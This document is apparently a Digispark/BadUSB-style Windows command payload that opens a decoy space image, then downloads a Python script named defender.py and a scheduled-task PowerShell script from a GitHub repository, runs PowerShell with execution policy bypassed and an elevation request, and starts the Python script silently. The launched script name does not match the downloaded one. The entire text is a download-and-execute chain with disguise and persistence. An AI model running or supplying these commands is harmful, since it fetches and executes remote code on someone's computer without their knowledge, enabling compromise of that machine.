cd %TEMP%
powershell Invoke-WebRequest 'https://cdn.pixabay.com/photo/2023/01/10/10/47/space-7709489_1280.jpg' -OutFile universe.png
universe.png
powershell Invoke-WebRequest -Uri https://raw.githubusercontent.com/ashwanthcreators/Digispark/main/defender.py -OutFile defender.py
powershell Invoke-WebRequest -Uri https://raw.githubusercontent.com/ashwanthcreators/Digispark/main/ConfigureScheduledTask.ps1 -OutFile ConfigureScheduledTask.ps1
powershell -NoProfile -ExecutionPolicy Bypass -Command "& { Start-Process powershell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File %TEMP%\ConfigureDefenderTask.ps1' -Verb RunAs }"
pythonw defender.py
